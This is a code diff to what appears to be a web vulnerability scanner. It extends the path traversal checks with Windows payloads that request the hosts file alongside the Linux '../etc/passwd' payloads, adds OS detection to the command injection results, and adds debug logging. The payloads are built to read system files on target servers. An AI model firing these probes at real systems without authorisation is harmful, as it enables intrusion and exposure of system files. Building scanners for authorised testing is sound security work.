@@ -80,6 +80,15 @@ const xss_scan = async(req, res) => {
             return;
           }
 
+          headers = response.headers
+
+          for (const field in headers) {
+            console.log(`${field}: ${headers[field]}`);
+          }
+
+          // console.log(response_header[0].indexOf(':'))
+
+
         if(body.includes(payload)){
           scan.create({
             scanID: currentScanID,
@@ -143,7 +152,8 @@ const pathtraversal_scan = async(req, res) => {
   const currentScanID = await getNewScanID();
 
   const url = req.body.href;
-  const path_traversal_payload_arr = "../";
+  const path_traversal_payload_arr_linux = "../";
+  const path_traversal_payload_arr_windows = "..\\";
   const regexp = /=/g;
 
   await crawl(url);
@@ -159,22 +169,41 @@ const pathtraversal_scan = async(req, res) => {
     if(match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1){
       for (let j = 0; j < 10; j++) {
         try {
-          let path_traversal_scan_payload = path_traversal_payload_arr.repeat(j + 1) + "etc/passwd"
-          let victim_url = site_tree[i].substr(0, match2 + 1) + path_traversal_scan_payload;
+          let path_traversal_scan_payload_linux = path_traversal_payload_arr_linux.repeat(j + 1) + "etc/passwd"
+          let path_traversal_scan_payload_windows = path_traversal_payload_arr_windows.repeat(j + 1) + "Windows\\System32\\drivers\\etc\\hosts"
+          let victim_url_linux = site_tree[i].substr(0, match2 + 1) + path_traversal_scan_payload_linux;
+          let victim_url_windows = site_tree[i].substr(0, match2 + 1) + path_traversal_scan_payload_windows;
 
-          const response = await new Promise(resolve => {
-              http.request(victim_url, resolve).end();
+          const response_linux = await new Promise(resolve => {
+              http.request(victim_url_linux, resolve).end();
           });
-          const status = response.statusCode;
+          const status_linux = response_linux.statusCode;
 
-          if (status === 200) {
-          
+          const response_windows = await new Promise(resolve => {
+            http.request(victim_url_windows, resolve).end();
+        });
+          const status_windows = response_windows.statusCode;
+          console.log(victim_url_windows)
+          console.log(path_traversal_scan_payload_windows)
+          if (status_linux === 200) {   
               scan.create({
               scanID: currentScanID,
               scanType: "Path Traversal",
               inputURL: url,
               scanURL: site_tree[i],
-              scanPayload: path_traversal_scan_payload
+              osInfo: "Linux Server",
+              scanPayload: path_traversal_scan_payload_linux
+              });
+              break;
+          }
+          else if (status_windows === 200) {
+            scan.create({
+              scanID: currentScanID,
+              scanType: "Path Traversal",
+              inputURL: url,
+              scanURL: site_tree[i],
+              osInfo: "Windows Server",
+              scanPayload: path_traversal_scan_payload_windows
               });
               break;
           }
@@ -214,32 +243,42 @@ const os_command_injection = async (req, res) => {
         try {
           const response = await axios.get(victim_url);
 
+
+          // console.log(response.data.includes("<DIR>"))
           if(response.data.includes("root:x:0:0:root:/root:/bin/bash")) {
             os_command_injection_success_data = true;
+            os_info_os_command_injection = "Linux Server"
+          }
+
+          if (response.data.includes("&lt;DIR&gt;")) {
+            os_command_injection_success_data = true;
+            os_info_os_command_injection = "Windows Server"
           }
           
-          console.log(os_command_injection_payload)
-          console.log(os_command_injection_success_data)
-          console.log(victim_base_url)
-
+          // console.log(os_command_injection_payload)
+          // console.log(os_command_injection_success_data)
+          // console.log(victim_base_url)
+          console.log(response.data)
           if(os_command_injection_success_data) {
             try {
+              console.log("status is", response.status)
               await scan.create({
                 scanID: currentScanID,
                 scanType: "OS Command Injection",
                 inputURL: href,
                 scanURL: victim_base_url,
+                osInfo: os_info_os_command_injection,
                 scanPayload: os_command_injection_payload,
               });
 
               os_command_injection_success_data = false;
             } catch (error) {
-              console.error('Error creating scan of os_command_injection');
+              // console.error('Error creating scan of os_command_injection');
               continue;
             }
           }
         } catch (error) {
-          console.error('Error in payload loop of os_command_injection:', error.message);
+          // console.error('Error in payload loop of os_command_injection:', error.message);
           continue;
         }
       }
